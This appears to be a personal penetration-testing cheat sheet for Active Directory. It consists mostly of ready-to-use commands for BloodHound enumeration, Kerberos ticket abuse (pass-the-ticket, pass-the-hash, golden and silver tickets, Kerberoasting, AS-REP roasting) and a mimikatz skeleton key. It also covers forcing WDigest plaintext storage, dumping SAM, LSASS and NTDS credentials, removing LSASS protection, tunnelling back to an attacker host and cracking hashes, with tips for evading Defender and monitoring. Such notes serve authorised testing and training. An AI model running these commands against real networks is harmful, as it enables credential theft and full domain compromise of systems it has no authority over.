  * `Invoke-Bloodhound` (from SharpHound.ps1)  
    * `powershell -ep bypass`  
    * `. .\SharpHound.ps1`  
    * `Invoke-Bloodhound -CollectionMethod [method] -Domain [domain] -ExcludeDCs -ZipFileName [outfile]`

* on first run: CollectionMethod ⇒ All  
* on subsequent runs (to get updated session info): CollectionMethod ⇒ Session  
  * in BloodHound, click Database Info → Clear Sessions

  ### Analysis

* `neo4j console`  
* `bloodhound --no-sandbox`

`MATCH (m:Computer) RETURN m`  
`MATCH (m:User) RETURN m`

# **Kerberos**

Kerberos Authentication  
![][image1]

AS\_REP ⇒ provides TGT ⁠– ticket to get other service tickets

* you can only have one TGT

TGS\_REP ⇒ provides TGS – ticket to get access to specific service

## **Ticket Conversion**

Converting tickets between impacket and mimikatz/Rubeus format

`kirbi2ccache [kirbi file] [ccache file]`  
`ccache2kirbi [ccache file] [kirbi file]`

`impacket-ticketConverter [ccache/kirbi file] [kirbi/ccache file]`

* `kirbi` ⇒ mimikatz  
* `ccache` ⇒ impacket

  ## **Request New Initial TGT**

**Note:** requires user’s password or hash

**Rubeus**  
`rubeus asktgt /domain: /user: /password:`

* `/enctype:[rc4|aes128|aes256|3des]`  
  * use `aes256` (default) for `enctype`  
* if you don’t have password but have hash, replace `/password:` with `/rc4:` `/aes128:` `/aes256:` or `/des:`

**Mimikatz**  
`tgt::ask /domain: /user: /password:`

**Impacket** (Remote)  
`impacket-getTGT [domain]/[user]:[password]`

* `-dc-ip [DC]`  
* `-hashes [hash]`

`export KRB5CCNAME=[ticket].ccache`

## **Request Delegated TGT**

*can’t change passwords with delegated TGTs but can request TGSes*

**Notes:**

* domain controllers by default can provide delegated TGTs  
* normal for some processes (like explorer) but weird for others (like notepad). For processes that it’s weird, if you don’t want to get flagged by Windows Defender be sure to use `/host`  
* useful for using impacket scripts without knowing password → convert ticket to `ccache`

**Rubeus**  
`rubeus tgtdeleg`

* `/target:[SPN]`

**Mimikatz**  
`tgt::deleg` ⇒ contacts domain controller by default

* `/host:[FQDN]` ⇒ have another host delegate for you (stealthy)  
  * find with `Get-AdComputer -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"`

  ## **Request TGS**

**Rubeus**  
`rubeus asktgs /service:[SPN]/[FQDN]`

* To impersonate another user (same as request TGT):  
  * `/enctype:`  
  * `/user:[username]`  
  * `/password:[password]`  
    * if you don’t have password but have hash, replace `/password:` with `/rc4:` `/aes128:` `/aes256:` or `/des:`

**Mimikatz**  
`kerberos::ask /target:[SPN]/[FQDN]`

* Optional `/export` to export

**Impacket** (Remote)  
`impacket-getST [domain]/[user]:[password] -spn [service]/[host]`

* `-dc-ip [DC]`  
* `-hashes [hash]`  
* `-impersonate [user]`

**Note:** Automatically modifies impersonate TGS so it can be used with other impacket tools.

## **Modify Existing TGS for Another Service**

**Rubeus**  
`rubeus asktgs /altservice:[SPN] /ticket:[ticket]`

* `/ptt` will automatically load onto current logon session

**Impacket** (Remote)  
See note above. Realistically, this is only used in constrained delegation attacks so look there.

## **Harvest Tickets** {#harvest-tickets}

**Rubeus**  
`rubeus harvest /interval:30` ⇒ list current session TGT

* `interval`: time between harvests (seconds)

`rubeus triage` ⇒ list current session all tickets with logon id and expiration time  
`rubeus klist` ⇒ list current session tickets with detailed info  
`rubeus dump` ⇒ extract all tickets (basically `/export` for mimikatz)

* `/user:[user]` for a specific user  
* `/service:[service]` for a specific service  
* `/luid:[logon id]` for specific session, if we have access to all sessions (admin)  
* `/nowrap` ⇒ easier copy-and-paste

**Mimikatz**  
`kerberos::tgt` ⇒ list current session TGT  
`kerberos::list` ⇒ list current session all tickets  
`sekurlsa::tickets` ⇒ list all tickets for all sessions but injects into LSASS memory so don’t do it if there’s a monitoring service

* add `/export` to any of these to export but first `base64 /out:true` and `base64 /in:true` to export base64 encoded (less likely to be detected)

  ## **Harvest Keys**

**Mimikatz**  
`sekurlsa::ekeys`

## **Purge Tickets**

**Rubeus**  
`rubeus purge`

**Mimikatz**  
`kerberos::purge`

# **Pass-the-Key (PTK)/Overpass-the-Hash (OPTH)**

pass-the-key or pass-the-hash to obtain a TGT

**Rubeus**  
`rubeus asktgt /domain:[domain] /user:[user] /rc4:[hash] /ptt`

**Mimikatz**  
`sekurlsa::pth /user:[user] /domain:[domain] /rc4:[hash]`

* `/run:[cmd.exe` OR `powershell.exe]`

**Impacket** (Remote)  
`impacket-getTGT [domain]/[user]:[password]`

* `-dc-ip [DC]`  
* `-hashes [hash]`

`export KRB5CCNAME=[ticket].ccache`

# **Pass-the-Ticket (PTT)**

**Note:** can either pass the TGT or pass the TGS

* dump the ticket to be passed (*see [Harvest Tickets](#harvest-tickets) above*)  
  * for Mimikatz, export tickets with `sekurlsa::tickets /export`

**Rubeus**  
`rubeus ptt /ticket:[ticket]`

**Mimikatz**  
`kerberos::ptt [ticket]`

* verify with `klist` ⇒ list cached tickets

**Impacket**  
`export KRB5CCNAME=[ticket].ccache`

# **Golden/Silver Ticket**

**Golden Ticket:** create forged TGT for domain admin using admin’s hash  
**Silver Ticket:** create forged TGS for service using service’s hash ⇒ useful for impersonating users when logging into a service

* same effect as requesting a TGT or TGS, but without communicating with the domain controller  
* you can create it for any user, even one that doesn’t exist

**Mimikatz**

Domain SID:  
`wmic useraccount get name,sid`

Current Realm:  
`kerberos::golden /user: /domain: /sid: /krbtgt: /ptt`

* `sid` ⇒ DC SID  
* `krbtgt` ⇒ `[NTLM hash]`  
* `user` and `id` can be whatever you want them to be  
  * `/user:Administrator /id:500` for golden ticket  
* `service` ⇒ specify SPN for silver ticket

Inter-Realm:  
`kerberos::golden /user: /domain: /sid: /krbtgt: /service:krbtgt /sids: /ptt`

* `sid` ⇒ child DC SID  
* `krbtgt` ⇒ `[NTLM hash]`  
* `sids` ⇒ enterprise admin group SID  
* `user` and `id` can be whatever you want them to be  
  * `/user:Administrator /id:500` for golden ticket

**Impacket**

Domain SID:  
`impacket-getPac -targetUser Administrator [domain]/[user]:[password]`  
`crackmapexec ldap [DC] -u [user] -p [password] -k --get-sid`

Current Realm:  
`impacket-ticketer -domain [domain] -domain-sid [SID] -nthash [krbtgt hash] Administrator`

* for another user: replace `Administrator` with `-user-id [ID] [user]`  
* `-spn [SPN]` for silver ticket

`export KRB5CCNAME=[ticket].ccache`

Inter-Realm:  
**Manually**  
`impacket-ticketer -domain [domain] -domain-sid [SID] -nthash [krbtgt hash] -spn krbtgt -extra-sid [enterprise admin group SID]`  
`export KRB5CCNAME=[ticket].ccache`

**Automatically**  
`impacket-raiseChild [domain]/[user]:[password]`

* `-w [ticket] ⇒ write out golden ticket`  
* `-target-exec [host] ⇒ psexec to host after compromise`

# **Skeleton Key**

used to access any SMB share with the same password

* `misc::skeleton`  
  * default password is `mimikatz`  
* *see [Interacting with SMB](https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X_eibU_4B0/edit#heading=h.vexfc5fk3uaj) above*

# **AS-REP Roasting**

### Obtaining Hash

**Rubeus**  
`rubeus asreproast /format:[hashcat/john] /outfile:hashes.txt`

**Impacket**  
`impacket-GetNPUsers [domain]/[user]:[password]`

* `-dc-ip [DC]`  
* `-hashes [hash]`  
* without creds (don’t provide `[user]:[password]`) ⇒ `-usersfile [usernames]`  
* `-request -format [hashcat/john] -outputfile hashes.txt`

  ### Cracking

`hashcat -m 18200 hashes.txt [wordlist]`  
`john hashes.txt --wordlist [wordlist]`

# **Kerberoasting (TGS-REP Roasting)**

**Note:** requires access to any user account on the domain

### Obtaining Hash

**Rubeus**  
`rubeus kerberoast /outfile:hashes.txt`

**Impacket**  
`impacket-GetUserSPNs [domain]/[user]:[password]`

* `-dc-ip [DC]`  
* `-hashes [hash]`  
* `-request-user [SPN]`  
* `-request -outputfile hashes.txt`

  ### Cracking

`hashcat -m 13100 hashes.txt [wordlist]`  
`john hashes.txt --wordlist [wordlist]`

# **Constrained Delegation**

### Check for Constrained Delegation

`Get-Net[User/Computer] -TrustedToAuth | Select name,msds-allowedtodelegateto,useraccountcontrol`  
`Get-Net[User/Computer] [name] | Select-Object -ExpandProperty msds-allowedtodelegateto`

`impacket-findDelegation [domain]/[user]:[password]`

### Exploit Constrained Delegation

`impacket-getST -spn [service]/[host] -impersonate [user to impersonate] [domain]/[user]:[password]`  
`export KRB5CCNAME=[ticket].ccache`

You can also use Rubeus:

1. Request TGT for service  
2. Request TGS on behalf of user (`Rubeus s4u`)  
3. Modify existing TGS for another service (like `cifs`)  
4. Load TGS

However, this is probably a waste of your time since impacket does this in one command.

# **WDigest Plaintext Logon Credentials**

* `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1` ⇒ force WDigest to store logon credentials in plaintext  
* wait for user to log in  
* `sekurlsa::wdigest` ⇒ check for plaintext passwords

# **Group Policy Preferences (GPP)**

**Note:** patched in MS14-025

**Locally**

1. `C:\Windows\SYSVOL\Preferences\Groups\Groups.xml` on domain controller  
2. copy cpassword from `cpassword` annotation  
3. `gpp-decrypt [cpassword]`

**Impacket**  
`impacket-Get-GPPPassword [domain]/[user]:[password]@[DC]`

* `-xmlfile [Groups.xml file] local` ⇒ parse local xml file

# **Pivoting**

[https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)

# **Dumping Hashes**

## **Linux**

* `cat /etc/passwd` ⇒ users  
* `cat /etc/shadow` ⇒ password hashes  
* `unshadow /etc/passwd /etc/shadow > hashes.txt` ⇒ combine for hash cracking

  ## **Windows**

[https://www.thehacker.recipes/ad/movement/credentials/dumping](https://www.thehacker.recipes/ad/movement/credentials/dumping)  
Hashes are stored in three places:

* SAM ⇒ local user accounts  
* LSA ⇒ domain user accounts  
* NTDS.dit ⇒ everyone on domain (DC only)

  ### Locally

`reg save HKLM\SAM "C:\Windows\Temp\sam.save"`  
`reg save HKLM\SECURITY "C:\Windows\Temp\security.save"`  
`reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"`

Task Manager → Right click lsass.exe → Create dump file  
`procdump -accepteula -ma lsass.exe lsass.dmp`

Control Panel → User Accounts → Credential Manager

`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`

### Mimikatz

* `token::elevate`  
* `privilege::debug`

* `lsadump::sam /patch` ⇒ SAM hashes  
* `lsadump::lsa /patch` OR `lsadump::lsa /inject` ⇒ LSA hashes  
* `sekurlsa::msv` ⇒ hashes in LSASS memory  
* `sekurlsa::logonpasswords` ⇒ hashes for users logged in since last reboot  
  * if this returns an error:  
    `!+`  
    `!processprotect /process:lsass.exe /remove`  
    try again  
* `sekurlsa::credman` ⇒ hashes in Windows Credential Manager  
* `lsadump::dcsync /domain:[domain] /all /csv` ⇒ NTDS.dit  
  * equivalent of `-just-dc` in `impacket-secretsdump`

  ### Impacket

* `impacket-secretsdump [domain]/[user]:[password]@[host]`

	OR

* `impacket-secretsdump [domain]/[user]@[host] -hashes [hash]`

*Flags:*

* `-just-dc` ⇒ only NTDS.dit data (NTLM hashes and Kerberos keys)  
* `-just-dc-ntlm` ⇒ only NTDS.dit data (NTLM hashes only)  
* `-sam [SAM file] -system [SYSTEM file] -security [SECURITY file] local` ⇒ dump directly from SAM  
* `-ntds [NTDS file] -system [SYSTEM file] -security [SECURITY file] local` ⇒ dump directly from NTDS  
* `-no-pass` ⇒ don’t prompt for password (used with \-k)  
* `-k [ccache file]` ⇒ use kerberos ticket

  ### CrackMapExec

`crackmapexec smb [host] -u [username] -p [password] [--sam/--lsa/--ntds]`

# **Pass-the-Hash (PTH)**

[https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)  
**Note:** Hash is in the form `[LM hash]:[NT hash]` unless otherwise stated. LM hash can also be either empty or 32 zeros in most cases.

### Mimikatz

* `token::revert`  
* `sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[NT hash] /run:"[command]"`

  ### CrackMapExec

* `crackmapexec [protocol] [host] -d [domain] -u [user] -H [NT hash] -x [command]`  
  * Can use `--local-auth` instead of `-d`  
  * `-t [threads]`  
  * `--verbose`

`crackmapexec [protocol] -h` for more info  
**Protocols:**

* `FTP`  
* `RDP`  
* `MSSQL`  
* `SMB`  
* `LDAP`  
* `SSH`  
* `WinRM`

  ### Impacket

Note: If you have a Kerberos ticket, you can omit `-hashes` and use `-k -no-pass` instead. *See [Request New Initial TGT](https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X_eibU_4B0/edit#heading=h.8zkfly6nu0pz) or [Request Delegated TGT](https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X_eibU_4B0/edit#heading=h.n3l1v6yyohv) above*.

* Be sure to modify relevant sections of `/etc/krb5.conf`: `domain_realm` and `realms`

`impacket-smbclient [domain]/[user]:[password]@[host]`  
`impacket-smbexec [domain]/[user]:[password]@[host]`  
`impacket-psexec [domain]/[user]:[password]@[host]`  
`impacket-atexec [domain]/[user]:[password]@[host]`  
`impacket-wmiexec [domain]/[user]:[password]@[host]`  
`impacket-dcomexec [domain]/[user]:[password]@[host]`  
`impacket-mssqlclient [domain]/[user]:[password]@[host]`

`impacket-GetADUsers`  
`impacket-getArch`  
`impacket-lookupsid`  
`impacket-machine_role`  
`impacket-netview`

`impacket-rdp_check`  
`impacket-mqtt_check`

`impacket-mimikatz`  
`impacket-reg`  
`impacket-services`

`impacket-rpcdump`  
`impacket-samrdump`

`impacket-addcomputer`

### Metasploit Modules

* `exploit/windows/smb/psexec`  
  * “Use custom templates or MOF upload method to circumvent AV detection”  
* `auxiliary/admin/smb/psexec_command`  
* `exploit/windows/local/current_user_psexec`

# **Port Redirection/Tunnelling**

# **SSH** {#ssh}

[https://youtu.be/JKrO5WABdoY](https://youtu.be/JKrO5WABdoY)

A device has access to a port I want.  
`ssh [`device I’m connecting to that has what I want – `user@ip] -p [`port to ssh to that device on – `22] -L [`what port of mine I want it on`]:[`what I want – `ip:port]`

I have access to a port a device wants.  
`ssh [`device I’m connecting to that wants what I have – `user@ip] -p [`port to ssh to that device on – `22] -R [`what port of theirs they want it on`]:[`what they want – `ip:port]`

# **ProxyChains**

### SSH

From target (SSH server on attacker): `ssh -fN -R [port] root@[attacker]`  
From attacker (SSH server on target): `ssh -fN -D [port] [user]@[target]`

### Chisel

On attacker: `chisel server -p 8000 --socks5 --reverse`  
On target: `chisel client [attacker]:8000 R:socks`

edit `/etc/proxychains.conf`  
`...`  
`socks5    [host] 	1080`

`proxychains [command to execute on target]`

### Ligolo-ng

Prep (on attacker):  
`ip tuntap add user [user] mode tun ligolo`  
`ip link set ligolo up`  
`ip route add [network] dev ligolo`

On attacker (proxy): `ligolo -selfcert -laddr 0.0.0.0:8000`  
On target (agent): `ligolo -connect [attacker]:8000 -ignore-cert`

`session`  
`start`

`listener_add --addr 0.0.0.0:[target port] --to 127.0.0.1:[kali port] --tcp`

# **Hash Cracking**

[CrackStation](https://crackstation.net)

# **Wordlist Generation**

## **Crunch**

`crunch [minimum num characters] [maximum num characters] [characters] -t [pattern] -b [max filesize] -o [filename] -p` (no repeating characters) or `-p [word1] [word2]...` (mix words no repeat)

* pattern:  
  * `@` ⇒ lowercase letters  
  * `,` ⇒ uppercase letters  
  * `%` ⇒ numbers  
  * `^` ⇒ special characters

`crunch [minimum num characters] [maximum num characters] -f /usr/share/crunch/charset.lst [charset] -t [pattern] -b [max filesize] -o [filename]`

* search charsets using `cat /usr/share/crunch/charset.lst`

`man crunch` for more info

* example: `crunch 6 6 0123456789ABCDEF -o crunch1.txt`

  ## **Cewl**

`cewl [base URL] -m [min word length] -d [crawl depth] -w [output file] --with-numbers`

# **Identification**

[hash examples](https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401)  
`hash-identifier`

# **HashCat**

`hashcat -m [type] [hashes] [wordlist]`  
`hashcat -m [type] -a 3 [hashes] [mask (optional)]`

* `?l` ⇒ lowercase letters  
* `?u` ⇒ uppercase letters  
* `?d` ⇒ digits  
* `?s` ⇒ special characters  
* `?a` ⇒ all of the above  
* `?b` ⇒ yucky bytes (null, etc.)

**Windows NTLM:** `-m 1000`

### Rules

[https://hashcat.net/wiki/doku.php?id=rule\_based\_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

`/usr/share/hashcat/rules`  
`hashcat -r [file].rule --stdout [wordlist]`  
`hashcat -r [file].rule …`

# **John**

`unshadow /etc/passwd /etc/shadow > [hashlist]`  
`john [hashes] --format=[type] --wordlist=[wordlist]`  
`rm /etc/john/john.pot`

### Rules

`/etc/john/john.conf` has all rules

* add section with `[List.Rules:rulename]` followed by hashcat style rules

`john --rules=[rulename]`  


[image1]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAd4AAAFfCAYAAADgcq2+AACAAElEQVR4XuzdB7QkVbn2ceSaWCqGK94koneBSEaQPAxBkSQMQXKWJEGyARFURMQEKoogkjNIzkFQJIkogoABRgQBsxiu2c/65rd1H+rUdDzd1af7nPe/Vq0506G6uqp6P/uNe54iCIIgCIKBMU/1gSAIgiAI6iOENwiCIAgGSAhvEARBEAyQEN4gCCbE3/72t+ITn/hE8f73vz+22GL713b44YcXl19+efH73/+++pMZI4Q3CIIJ8Y1vfKNYeumliy984QuxxRbbv7YPfOADxc4771x85zvfqf5kxgjhDYJgQhDeN7/5zdWHg2BaQ3Df+973hvAGQdB/QniDYG5CeIMgqI0Q3iCYmxDeIAhqI4Q3qJv/+7//K/74xz9WHx5qQniDIKiNXoX3/vvvL66++uriD3/4w9hjN954Y3HVVVeVXtWee++9t7jjjjuKv/71r9WnBsKtt95afO1rXxv32O23315861vf6vmY7rzzzuLMM88ctzk/MspBlK644orit7/9beWdz/DYY48VP/7xj6sPJy6++OLi5z//efG73/2uuOaaa4p//OMf1Zc05Sc/+Unx5JNPFn//+9+LX/ziF8X5559ffcmE+fa3v12cc845KWv+05/+dMoS7oW//OUv6X4bBCG8QRDURq/Ce9xxxxXrrLNO8dRTT6X/E48NN9wwiUE3fOQjHyne/e53J+toMjjggAOKgw46aOz/N998c7HRRhsVX/nKV3oW3gMPPLBYf/31i/e9733FkUcembbNNtssCTuR/M1vflMceuihxS9/+cvqW8f4+Mc/Xlx66aXVhxP77bdf8fjjjxc/+tGPis0337z4f//v/1Vf0hTCeMEFFyTxf+KJJ4rddtut+pIJYSK26667Fu95z3uK0047rTj++OOLrbfeurjtttuqL+0YonvIIYdUH66FEN4gCGqjV+H92Mc+VsyYMSMN2qzDtddeO1lQGUL65S9/ufjUpz5VXHjhhUkc8LOf/Sy9/owzzkgip27ybW97W3HRRRcVH/rQh4p77rlnTPBYe8TBZ91www1JqGAgJoyf/exni4ceeiiJ/7XXXlscc8wxxRe/+MVkzREh1qDP/uhHP5pKRVh2VbLwEr+jjz662GSTTYq77rpr7HmP531//vOfT/tm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